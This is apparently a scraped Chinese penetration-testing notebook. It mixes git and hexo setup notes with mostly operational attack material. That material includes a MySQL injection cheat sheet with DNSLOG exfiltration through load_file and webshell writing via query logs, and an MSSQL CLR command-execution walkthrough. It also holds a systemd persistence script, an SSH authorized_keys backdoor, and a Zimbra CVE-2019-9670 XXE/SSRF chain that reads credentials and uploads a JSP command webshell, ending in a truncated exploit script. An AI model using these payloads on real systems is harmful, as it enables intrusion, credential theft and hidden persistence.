备忘录/Mysql.html.title: Mysql
备忘录/Mysql.html.description: mysql连接可控，且允许load local data infile 利用工具地址 https://github.com/rmb122/rogue_mysql_server SELECT group_concat(schema_name) FROM information_schema.schemata select user() # 有时候数据库用户这样写：xxxx@localhost，有时候这样写:xxxx@%，有啥区别。当是“%”的时候，说明任意地址都能对数据库操作，于是我们在外部就能连接别人的数据库 select group_concat(table_name) from information_schema.tables where table_schema=database() select group_concat(column_name) from information_schema.columns where table_name='abc' # 假设users表有5列，查第3列 select `3` from (select 1,2,3,4,5 union select * from users limit 1,1) # 16进制 select 列名16进制 from users; # 判断数据库长度 select * from users where username=nouser or length(database())>8 # 判断数据库第1位字符的ascii码值 select * from users where username=nouser or ascii(substr(database(),1,1))<130 # sleep() select * from users where username=$username and if(length(database())>8,sleep(3),1) # BENCHMARK()，结果正确的时候，运行ENCODE('MSG','by 5 seconds')操作50000000次，会占用一段时间 select * from users where username=$username and if(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)) # 5.5<mysql版本<5.6 exp(~(select * from(select user())a)) # 输出字符长度限制为32个字符 and updatexml(1,concat(0x7e,(select user()),0x7e),1) and (extractvalue(1,concat(0x7e,(select user()),0x7e))) # floor select * from users where id=1 and (select * from (select count(*),concat(0x7e, (select schema_name from information_schema.schemata limit 1,1),floor(rand(0)*2),0x7e)x from information_schema.tables group by x) as y); union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)) select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2)) -- 如果关键的表被禁用了可以使用这种形式，本地没成功 select min(@a:=1) from information_schema.tables group by concat(version(),@a:=(@a+1)%2) -- 如果rand被禁用了可以使用用户变量来报错 # 仅可取数据库版本信息 and exists(select * from (select * from(select name_const(version(),0)) a join (select name_const(version(),0)) b)c) # 5.5<mysql版本<5.6 and geometrycollection((select * from(select * from (version())a)b)) and polygon((select * from(select * from(version())a)b)) and multipoint((select * from(select * from(version())a)b)) and multlinestring((select * from (version())a)b)) and linestring((select * from(select * from(version())a)b)) and multipolygon((select * from(select * from(select user())a)b)) # join爆第一列，第二列，第三列名 select * from sc union all select * from (select * from information_schema.tables as a join information_schema.tables b)c; select * from sc union all select * from (select * from information_schema.tables as a join information_schema.tables b using(table_catalog))c; select * from sc union all select * from (select * from information_schema.tables as a join information_schema.tables b using(table_catalog,table_schema))c; # bigint边界数值进行数值运算 select !(select * from(select user())a)-~0; # mysql 8.0.x SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1)); SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1)); # gtid select gtid_subset(user(),1); select gtid_subset(hex(substr(user(),1,200)),1); select gtid_subtract((select * from(select user())a),1); 报错注入拼接字符时返回正常页面的问题问题：有时使用xpath报错拼接字符串时会返回正常页面 原因： 从原理出发，可能是使用concat拼接时有数据为null，导致整个拼接字符为null,这又符合xpath_string语法，所以页面正常，只是xpath没匹配到结果 解决： 使用concat_ws替代，忽略所有null值 语法实例：concat_ws(';',user,pass,tel) # @@secure_file_priv 变量不为null select load_file(concat('\\\\',(select user()),'.xxxx.ceye.io\xxxx')) # 为什么Windows可用，Linux不行？ # 这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以`\\`开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个`\\\\`中的两个`\`是用来进行转义处理的。 判断注入类型-rand#数字型order by注入时,语句order by=2 and 1=2,和order by=2 and 1=1 显示的结果一样,所以无法用来判断注入点类型，而rand()在数字型中，每次刷新会显示不同的排序结果，当在字符型中用?sort=rand(),则不会有效果,排序不会改变，因此用rand()可判断注入点类型 select * from users order by rand() 结合if盲注# 数字型 ?order=if(表达式,2,3) # 知道列名 ?order=if(表达式,id,username) # 不知道列名，表达式为false时，sql语句会报ERROR 1242 (21000): Subquery returns more than 1 row的错误，导致查询内容为空 order=if(表达式,1,(select id from information_schema.tables)) 结合时间盲注order by if(表达式,1,sleep(1)) 结合报错order by updatexml(1,if(1=2,1,(表达式)),1) # 有报错信息 select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); # 布尔盲注，参考 LIMIT子句中的盲 SQL注入漏洞利用 https://xz.aliyun.com/t/5858 select * from tbl_albums where page=2 order by album_date asc LIMIT 0,ascii(substr((Select version()),1,1)) # 无回显，结合时间盲注，参考：https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html select id from users order by id limit 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(if(mid(version(),1,1) like 5, BENCHMARK(5000000,SHA1(1)),1))))),1) -- 服务端主机名，mysql所在服务器 select @@hostname -- 客户端主机名 select HOST from information_schema.PROCESSLIST # left(a,b)从左侧截取a的前b位 left(database(),1)>'s' # substr(a,b,c)从b位置开始，截取字符串a的c长度。ascii()将某个字符转换为ascii值 ascii(substr((select database()),1,1))=98 # mid(a,b,c)从位置b开始，截取a字符串的c位，ord()函数同ascii()，将字符转为ascii值 ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98 # regexp正则注入，user()结果为root，regexp为匹配root的正则表达式 # 参考链接：https://www.cnblogs.com/lcamry/articles/5717442.html select user() regexp '^[a-z]'; select user() regexp '^ro' # 查询权限 select @@secure_file_priv; select @@global.secure_file_priv; # 读文件，前两种需要`secure-file-priv`无值或为有利目录。都需要知道要读取的文件所在的绝对路径。要读取的文件大小必须小于`max_allowed_packet`所设置的值。 select load_file(file_path); load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取服务端文件 load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; #读取客户端文件 # 低权限读文件，mysql 5.5.53 secure-file-priv=NULL 读文件payload，mysql8测试失败，mysql 5.7 可行，其他版本自测 drop table mysql.m1; CREATE TABLE mysql.m1 (code TEXT ); LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '\n'; select * from mysql.m1; # @@secure_file_priv的值不为NULL select 1,2,3 into outfile 'd:\1.txt' select 1,2,3 into dumpfile 'd:\1.txt' 权限够，可以进行日志的设置操作 知道目标目录的绝对路径 # 请求日志 set global general_log_file = '/var/www/html/1.php'; set global general_log = on; select '<?php phpinfo();?>'; # 慢查询日志 set global slow_query_log_file='/var/www/html/2.php' set global slow_query_log=1; select '<?php phpinfo();?>'; 参考：https://blog.csdn.net/qq_40732354/article/details/99633971 步骤： 1.修改mysql配置文件，linux默认/etc/my.cnf 2.在文件中的 [mysqld] 下添加 skip-grant-tables = 1 3.重启mysql服务 systemctl restart mysqld 4.连接mysql，密码已置为空 # 修改my.ini max_allowed_packet = 32M #这个值越大越快,看内存 mysql -uroot -ppassword test -e "select now()" mysql -uroot -e "show databases;" mysqldump -h主机名 -P端口 -u用户名 -p密码 --databases database1,database2 > 文件名.sql select to_base64(user())

import random,sys # 异或运算
def do_xor(str_a,str_b): return (f'(\"{str_a}\"^\"{str_b}\")',chr(ord(str_a) ^ ord(str_b))) # 获取异或结果，保存到列表
def get_xorRes(myStr): elems = "" for i in range(32, 127): elems += chr(i) xorRes_list = [] for i in elems: for j in elems: xorRes = do_xor(i,j) if xorRes[1] in myStr: xorRes_list.append(xorRes[0] + "==>>" + xorRes[1]) return xorRes_list # 将列表中的多个异或结果保存到字典
def getRes(myStr): xorRes_list = get_xorRes(myStr) res = {} for i in range(0,len(myStr)): res[i] = [] for j in xorRes_list: if j[-1] == myStr[i]: res[i].append(j) return res # 从字典的元素列表中随机选取一个
def choiceRes(myStr): res = getRes(myStr) xorspel = [] for k in res: choice_v = random.choice(res[k]) xorspel.append(choice_v) return xorspel if __name__ == "__main__": if len(sys.argv) > 1: myStr = sys.argv[1] xorspel = choiceRes(myStr) for i in xorspel:print(i) else: print("Usage: python3 xorForStr.py assert") urllist = [] with open(filename,"r") as fr: urls = fr.readlines() for url in urls: url = url.strip("\n").strip("\r") urllist.append(url)

import subprocess def subprocess_popen(statement): p = subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE) # 执行shell语句并定义输出格式 while p.poll() is None: # 判断进程是否结束（Popen.poll()用于检查子进程（命令）是否已经执行结束，没结束返回None，结束后返回状态码） if p.wait() != 0: # 判断是否执行成功（Popen.wait()等待子进程结束，并返回状态码；如果设置并且在timeout指定的秒数之后进程还没有结束，将会抛出一个TimeoutExpired异常。） print("命令执行失败") return False else: re = p.stdout.readlines() # 获取原始执行结果 result = [] for i in range(len(re)): # 由于原始结果需要转换编码，所以循环转为utf8编码并且去除\n换行 res = re[i].decode('utf-8').strip('\r\n') result.append(res) return result print(subprocess_popen('whoami'))

例如，以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。

将SQLCLR权限级别修改为UNSAFE；修改.Net 框架版本为自己需要的版本；语言选择C# //4、右键项目，选择添加->新建项，新建SQL CLR C# 存储过程 //5、填入测试代码 using System; using System.Data; using System.Data.SqlClient; using System.Data.SqlTypes; using Microsoft.SqlServer.Server; using System.Collections.Generic; using System.Text; using System.Threading.Tasks; public partial class StoredProcedures { [Microsoft.SqlServer.Server.SqlProcedure] public static void SqlStoredProcedure1 () { // 在此处放置代码 System.Diagnostics.Process process = new System.Diagnostics.Process(); process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; process.StartInfo.FileName = "cmd.exe"; process.StartInfo.Arguments = "/C whoami > d:\\temp\\1.txt"; process.Start(); } } //6、将代码编译完成后，编译目录下会生成一个 DLL 文件，需要将 DLL 文件注册进目标数据库 开启CLREXEC sp_configure N'show advanced options', N'1' RECONFIGURE WITH OVERRIDE -- 开启clr enabled 选项 EXEC sp_configure N'clr enabled', N'1' RECONFIGURE WITH OVERRIDE -- 关闭所有服务器配置选项 EXEC sp_configure N'show advanced options', N'0' RECONFIGURE WITH OVERRIDE -- 如果存在权限问题，执行下面一段脚本 alter database [master] set TRUSTWORTHY on EXEC sp_changedbowner 'sa' 注册CLR-- 方法一：CLR 注册 DLL 支持十六进制的方式，以这种方式不需要将 DLL 文件落地到目标机器上，实现了无文件落地，能够规避杀软。并且，在目标无法处出网的情况下，也能完成操作 CREATE ASSEMBLY sp_cmdExec FROM 0x4D5A90000300000004000000FFFF0000B800000000000 WITH PERMISSION_SET = UNSAFE -- 方法二：将文件落地目标机器上后进行注册 CREATE ASSEMBLY sp_cmdExec FROM 'C:\ProgramData\Database1.dll' WITH PERMISSION_SET = UNSAFE 注册完后，创建存储过程CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME sp_cmdExec.StoredProcedures.CmdExec 执行命令EXEC sp_cmdExec 删除存储过程DROP sp_cmdExec; DROP ASSEMBLY sp_cmdExec; 如果没成功，可以换个数据库试试看。Exec OS Command Via MSSQL | Evi1cg's blog 差异备份 日志备份

#!/bin/bash # 获取所有开机自启的服务
services=$(systemctl list-unit-files --type=service --state=enabled | awk '{print $1}' | grep -v '^$') # 将服务转换为数组
service_array=($services) # 检查是否有可用的服务
if [ ${#service_array[@]} -eq 0 ]; then echo "system enable service not found" exit 1
fi # 随机选择一个服务
random_service=${service_array[RANDOM % ${#service_array[@]}]} # 获取服务的单位文件路径
unit_file_path=$(systemctl show -p FragmentPath "$random_service" | cut -d'=' -f2) # 检查单位文件是否存在
if [ ! -f "$unit_file_path" ]; then echo "service $random_service's file path not found" echo "please try again" exit 1
fi # 在 ExecStart 的下一行插入 echo 123
sed -i "/^ExecStart=/a ExecStartPost=-/bin/bash -c 'touch /tmp/admin'" "$unit_file_path" # 输出结果
echo "service file path: $unit_file_path"
echo "add ExecStartPost in $random_service success"

博客配置/git.html.title: git
博客配置/git.html.description:
git
推送项目到github
先克隆项目到本地
git clone https://github.com/Al0neme/al0neme.github.io.git 修改项目后，添加远程地址
git remote add origin https://github.com/Al0neme/al0neme.github.io.git 把所有文件添加到本地仓库缓存区
git add . 提交并补充说明
git commit -m "init" 推送到远程仓库main分支
git push origin main 更新项目到本地
git pull 自动备份bat脚本
@echo off
cd %cd%
echo currentDirectory: %cd%
git add .
git commit -m "update"
git push -u origin master
pause 自动备份shell脚本
#!/bin/bash
path=$(pwd)
echo "current path: "$path
git add .
git commit -m "update"
git push origin master
echo "push completed"

博客配置/hexo.html.title: hexo
博客配置/hexo.html.description:
1.安装nodejs，最好高一点版本，自带npm
2.安装hexonpm install -g hexo-cli
3.初始化cd al0neme.github.io
hexo init
4.本地部署hexo clean
hexo g
hexo s
5.远程部署
安装部署插件npm install hexo-deployer-git
修改配置文件_config.yml# Deployment
## Docs: https://hexo.io/docs/one-command-deployment
deploy: type: ''
执行hexo clean
hexo g
hexo d

工具使用/burpsuite.html.title: burpsuite
工具使用/burpsuite.html.description: 先加载备份文件夹my-burp-plugin/python-scripter中的python-scripter.py或者直接在burp插件商店装载，然后再python-scripter标签中加载update-http-req-resp.py内容即可。python-scripter.py地址https://github.com/portswigger/python-scripterupdate-http-req-resp.py# get header value def get_header_value(header_name, headers): for header in headers: if header.lower().startswith(header_name.lower()): return header.split(":")[1] return None # update header value def update_headers_value(header_name, header_newvalue, headers): for header in headers: if header.lower().startswith(header_name.lower()): headers.remove(header) header = header_name+": "+header_newvalue headers.add(header) return header return None # handle req and resp if messageIsRequest: # get req data req = messageInfo.getRequest() req_data = helpers.analyzeRequest(req) headers = req_data.getHeaders() body = req[req_data.getBodyOffset():].tostring() # update param,to handle other param,please replece name 'test' for param in req_data.getParameters(): if param.getName() == 'test': # update value,or you can replace 'admin' with other value newParamValue = "admin" newParam = helpers.buildParameter(str(param.getName()),newParamValue,param.getType()) newReqParam = helpers.updateParameter(req,newParam) messageInfo.setRequest(newReqParam) # update header,to handle other header,please replece name 'User-Agent' and replace value 'fuckagent' req = messageInfo.getRequest() req_data = helpers.analyzeRequest(req) headers = req_data.getHeaders() update_headers_value('User-Agent','fuckagent',headers) body = req[req_data.getBodyOffset():].tostring() newReq = helpers.buildHttpMessage(headers,body) messageInfo.setRequest(newReq) # messageInfo.setRequest(newHeader) else: # get resp data resp = messageInfo.getResponse() resp_data = helpers.analyzeResponse(resp) headers = resp_data.getHeaders() body = resp[resp_data.getBodyOffset():].tostring() # update response data,example header value and body value update_headers_value('Server','fuckserver',headers) newBody = body+"\n"+"what fuck" newResp = helpers.buildHttpMessage(headers,newBody) messageInfo.setResponse(newResp)

工具使用/mitmproxy.html.title: mitmproxy
工具使用/mitmproxy.html.description:
pip install mitmproxy
插件启动mitmdump -p 9090 -s websockets-update.py
websockets-update.pyfrom mitmproxy import http def websocket_message(flow: http.HTTPFlow): assert flow.websocket is not None # make type checker happy last_message = flow.websocket.messages[-1] if last_message.from_client: # get rep data print("client init message: "+str(last_message.content,'utf-8')) # update messagecontent,or you can update other value with replace '{"auth_user":"123","auth_pass":"123"}' messagecontent = b'{"auth_user":"123","auth_pass":"123"}' last_message.content = messagecontent print("after client update : "+str(messagecontent,'utf-8')) else: # get resp data print("server init message: "+str(last_message.content,'utf-8')) # update messagecontent,or you can update other value with replace 'fuckwebsocksts' messagecontent = str(last_message.content,'utf-8')+":::\n"+"fuckwebsocksts" print("after server update: "+messagecontent)

工具使用/nmap.html.title: nmap
工具使用/nmap.html.description:
使用ping扫描探测存活主机，不进行端口扫描# 老版是 -sP 参数
nmap -sn 10.0.0.0/24
使用arp扫描探测存活主机，内网推荐nmap -sn -PR 10.0.0.0/24
以一分钟不低于10000的发包率扫描全端口nmap --min-rate 10000 -p- 10.0.0.3
以一分钟不低于10000的发包率udp扫描全端口（结合上一个扫描进行对比，判断结果是否准确）nmap -sU --min-rate 10000 -p- 10.0.0.3
指定tcp扫描，获取端口服务信息（-sV），操作系统版（-O）本信息，指定端口时可以加入udp扫描出的端口nmap -sT -sV -O -p80,8080,9090 10.0.0.3
nmap --script=vuln -p80,8080,9090 10.0.0.3
# 跳过ping主机发现，直接端口扫描
nmap -P0 10.0.0.3
nmap -Pn 10.0.0.3
nmap --min-rate 10000 -p- -sT -sV 10.0.0.3
实际环境nmap -iL hosts.txt -Pn --min-rate 5000 --max-retries 1 --max-scan-delay 20ms -T4 --top-ports 1000 --exclude-ports 22,53 --open -oX nmap.xml

漏洞复现/SSH公钥后门.html.title: SSH公钥后门
漏洞复现/SSH公钥后门.html.description:
开启了sshd服务且支持公钥连接（文件为/etc/ssh/sshd_config）# 默认全回车即可设置为空密码登录key ssh-keygen -t rsa 默认生成的key在/home/当前用户/.ssh目录下
添加命令touch /tmp/1.txt到生成的公钥文件id_rsa.pub，将所有内容写入到靶机用户的authorized_keys文件中
攻击机连接靶机即可触发命令

我对这个公钥后门的理解是拿着公钥去执行command的内容，执行完了当然就断开连接了，那么可以换个思路，当执行完恶意命令后再执行一个bash命令，返回给登录用户一个shell，是不是就可以了呢？比如command设置为command="ping -c 1 fa.cye9n0.dnslog.cn && /bin/bash"
操作系统版本问题，可以尝试加一个bash -c 将命令编写为command="bash -c 'touch /tmp/1.sh'"的形式这个问题和1类似，因为执行的是反弹shell操作，所以在你的shell结束前会一直等待登录，其中如果ssh登录断掉shell也会断掉，反之亦然由于反弹shell会卡住登录，可能会引起管理员的注意，所以这个点可以只用来执行命令。实战环境记得先备份原文件！命令执行完后加一个还原覆盖操作，将原文件内容从新写入，复制、echo都可以，我这里用的echocommand="touch /tmp/1.txt && echo 'ssh-rsa  test@kali'>/home/test/.ssh/authorized_keys && /bin/bash" ssh-rsa  test@kali 触发后会还原原文件，一般这种操作用于结合其他利用，比如后门安装、计划任务啥的（ps：略显鸡肋，权限高其实可以直接写计划任务啥的，这一步似乎没太大必要）
Infecting SSH Public Keys with backdoors

漏洞复现/Zimbra XXE + SSRF.html.title: Zimbra XXE + SSRF
漏洞复现/Zimbra XXE + SSRF.html.description:
参考zimbra RCE环境搭建到复现再到exp编写 https://xz.aliyun.com/t/7991#toc-5 zimbra RCE 漏洞利用 https://cloud.tencent.com/developer/article/1752450 安装依赖ubuntu ip addr: 192.168.8.129 apt-get install libgmp10 libperl5.18 unzip pax sysstat sqlite3 dnsmasq wget ubuntu环境需要为14，其他版本可能安装libperl5.18会报错，后续可能也会有一大堆问题，所以还是用14比较好 配置hostname和dns服务器vim /etc/hostname mail.test.com vim /etc/hosts 192.168.8.129 mail.test.com mail
vim /etc/dnsmasq.conf server=192.168.8.130 domain=test.com mx-host=test.com, mail.test.com, 5 mx-host=mail.test.com, mail.test.com, 5 listen-address=127.0.0.1
下载有漏洞版本的zimbra，解压，进入解压后的目录进行安装wget https://files.zimbra.com/downloads/8.6.0_GA/zcs-8.6.0_GA_1153.UBUNTU14_64.20141215151116.tgz tar xvf zcs-8.6.0_GA_1153.UBUNTU14_64.20141215151116.tgz cd zcs-8.6.0_GA_1153.UBUNTU14_64.20141215151116 sudo ./install.sh 安装时注意观察返回结果，可能会报错缺少依赖信息，按缺少的依赖补充安装即可 一些缺少的依赖可以直接用apt-get安装，对于缺少libgmp3c2，参考文章中的链接已失效，可以采用以下链接安装 wget http://launchpadlibrarian.net/70575439/libgmp3c2_4.3.2+dfsg-2ubuntu1_amd64.deb sudo dpkg -i libgmp3c2_4.3.2+dfsg-2ubuntu1_amd64.deb 安装配置zimbra复现时使用的是dnsmasq，所以除了zimbra-dnscache选择 n ，其他默认 y 即可。 之后会进入Main menu界面，选择 6 配置 zimbra-store，选择 4 设置管理员密码，之后输入 a 应用配置，之后默认yes，最后保存更新系统设置yes即可 安装完成后，访问登陆界面即可 https://192.168.8.129:7071/zimbraAdmin 漏洞路由https://192.168.8.130:7071/Autodiscover/Autodiscover.xml 使用burpsuite或者其他接口测试工具以post方式发送一个空标签，Content-Type设置为application/xml，界面返回400解析错误，可能存在xxe
构造XML Poc验证是否存在XXE漏洞<!DOCTYPE asd [ <!ELEMENT name ANY > <!ENTITY asd SYSTEM "file:///etc/passwd" >]> <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"> <Request> <EMailAddress>asdasd@ad.com</EMailAddress> <AcceptableResponseSchema>&asd;</AcceptableResponseSchema> </Request> </Autodiscover> 页面503，返回了读取的文件信息，存在XXE
利用xxe获取localconfig.xml 中的用户名和密码，由于localconfig.xml为XML文件，需要加上CDATA标签才能作为文本读取，由于XXE不能内部实体进行拼接，所以此处需要使用外部dtd，payload构造如下：<!ENTITY % file SYSTEM "file:../conf/localconfig.xml"> <!ENTITY % start "<![CDATA["> <!ENTITY % end "]]>"> <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>"> 启动远程服务，发送如下payload，利用xxe读取默认用户zimbra的密码，密码字段在zimbra_ldap_passwordPOST /Autodiscover/Autodiscover.xml HTTP/1.1 Host: 192.168.8.130:7071 Content-Length: 400 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63 Content-Type: application/soap+xml; charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close <!DOCTYPE Autodiscover [ <!ENTITY % dtd SYSTEM "http://192.168.8.129:99/1.txt"> %dtd; %all; ]> <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"> <Request> <EMailAddress>aaaaa</EMailAddress> <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema> </Request> </Autodiscover> 成功读取到密码
利用前面的xxe漏洞读取到的账号密码，获取一个低权限tokenPOST /service/soap HTTP/1.1 Host: 192.168.8.130 Content-Length: 463 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63 Content-Type: application/soap+xml; charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"> <soap:Header> <context xmlns="urn:zimbra"> <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/> </context> </soap:Header> <soap:Body> <AuthRequest xmlns="urn:zimbraAccount"> <account by="adminName">zimbra</account> <password>lDsiZPjl</password> </AuthRequest> </soap:Body> </soap:Envelope> 这里是向客户端登陆处/service/soap发送，也可以向管理员登陆处7071端口/service/admin/soap发送payload直接获取高权限token，注意下改端口以及将<AuthRequest xmlns="urn:zimbraAccount">改为<AuthRequest xmlns="urn:zimbraAdmin">
将获取到的低权限token设置到cookie中，探测是否存在ssrf，注意，修改cookie时如果401错误，将cookie字段ZM_AUTH_TOKEN改为ZM_ADMIN_AUTH_TOKEN即可POST /service/proxy?target=https://abcd.0lzme4.dnslog.cn HTTP/1.1 Host: 192.168.8.130:7071 Content-Length: 0 Cookie: ZM_ADMIN_AUTH_TOKEN=0_445fad824269f204515a7c310c0fc7fbfcfc425c_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637383737333133323439343b747970653d363a7a696d6272613b7469643d31303a313338303230313330343b User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63 Content-Type: application/soap+xml; charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close


ssrf可利用后，结合低权限token获取一个高权限token，将<AuthRequest xmlns="urn:zimbraAccount">改为<AuthRequest xmlns="urn:zimbraAdmin">POST /service/proxy?target=https://192.168.8.130:7071/service/admin/soap HTTP/1.1 Host: 192.168.8.130:7071 Content-Length: 461 Cookie: ZM_ADMIN_AUTH_TOKEN=0_445fad824269f204515a7c310c0fc7fbfcfc425c_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637383737333133323439343b747970653d363a7a696d6272613b7469643d31303a313338303230313330343b User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63 Content-Type: application/soap+xml; charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"> <soap:Header> <context xmlns="urn:zimbra"> <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/> </context> </soap:Header> <soap:Body> <AuthRequest xmlns="urn:zimbraAdmin"> <account by="adminName">zimbra</account> <password>lDsiZPjl</password> </AuthRequest> </soap:Body> </soap:Envelope>
利用获取到的高权限token调用文件上传接口/service/extension/clientUploader/upload，上传webshellPOST /service/extension/clientUploader/upload HTTP/1.1 Host: 192.168.8.130:7071 Cookie: ZM_ADMIN_AUTH_TOKEN=0_20a7b6a582e9cbfdceb69a240f06aef59fccc313_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637383634333538333438363b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d31303a313738313434363538303b User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyfguo5iLr5MUuhaZ Content-Length: 622 ------WebKitFormBoundaryyfguo5iLr5MUuhaZ Content-Disposition: form-data; name="filename1" qweqwe ------WebKitFormBoundaryyfguo5iLr5MUuhaZ Content-Disposition: form-data; name="clientFile";filename="aa.jsp" <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while ((a = in.read(b)) != -1) { out.print(new String(b)); } out.print("</pre>"); %> ------WebKitFormBoundaryyfguo5iLr5MUuhaZ Content-Disposition: form-data; name="requestId" 111111 ------WebKitFormBoundaryyfguo5iLr5MUuhaZ-- webshell地址，访问时需要带上cookiehttps://192.168.8.130/downloads/aa.jsp 参考https://github.com/rek7/Zimbra-RCE#!/usr/bin/python3 # Title: Zimbra Autodiscover Servlet XXE and ProxyServlet SSRF <= 8.7.0 and 8.7.11 # Shodan Dork: 8.6.0_GA_1153 # Vendor Homepage: https://www.zimbra.com/ # Version: <= 8.7.0 and 8.7.11 # Tested on: Debian # CVE : CVE-2019-9670 # References: # http://www.rapid7.com/db/modules/exploit/linux/http/zimbra_xxe_rce import requests import sys import urllib.parse import re import argparse from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) class zimbra_rce(object): def __init__(self, base_url, dtd_url, file_name, payload_file): self.base_url = base_url self.dtd_url = dtd_url self.low_auth = {} self.file_name = file_name self.payload = open(payload_file, "r").read() self.pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>") def upload_dtd_payload(self): ''' Example DTD payload: <!ENTITY % file SYSTEM "file:../conf/localconfig.xml"> <!ENTITY % start "<![CDATA["> <!ENTITY % end "]]>"> <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>"> ''' xxe_payload = r"""<!DOCTYPE Autodiscover [ <!ENTITY % dtd SYSTEM "{}"> %dtd; %all; ]> <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"> <Request> <EMailAddress>aaaaa</EMailAddress> <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema> </Request> </Autodiscover>""".format(self.dtd_url) headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63', "Content-Type":"application/xml" } print("[*] Uploading DTD.", end="\r") dtd_request = requests.post(self.base_url+"/Autodiscover/Autodiscover.xml",data=xxe_payload,headers=headers,verify=False,timeout=15) # print(r.text) if 'response schema not available' not in dtd_request.text: print("[-] Site Not Vulnerable To XXE.") return False else: print("[+] Uploaded DTD.") print("[*] Attempting to extract User/Pass.", end="\r") pattern_name = re.compile(r"<key name=(\"|")zimbra_user(\"|")>\n.*?<value>(.*?)<\/value>") pattern_password = re.compile(r"<key name=(\"|")zimbra_ldap_password(\"|")>\n.*?<value>(.*?)<\/value>") if pattern_name.findall(dtd_request.text) and pattern_password.findall(dtd_request.text): username = pattern_name.findall(dtd_request.text)[0][2] password = pattern_password.findall(dtd_request.text)[0][2] self.low_auth = {"username" : username, "password" : password} print("[+] Extracted Username: {} Password: {}".format(username, password)) return True print("[-] Unable To extract User/Pass.") return False def make_xml_auth_body(self, xmlns, username, password): auth_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"> <soap:Header> <context xmlns="urn:zimbra"> <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/> </context> </soap:Header> <soap:Body> <AuthRequest xmlns="{}"> <account by="adminName">{}</account> <password>{}</password> </AuthRequest> </soap:Body> </soap:Envelope>""" return auth_body.format(xmlns, username, password) def gather_low_auth_token(self): print("[*] Getting Low Privilege Auth Token", end="\r") headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 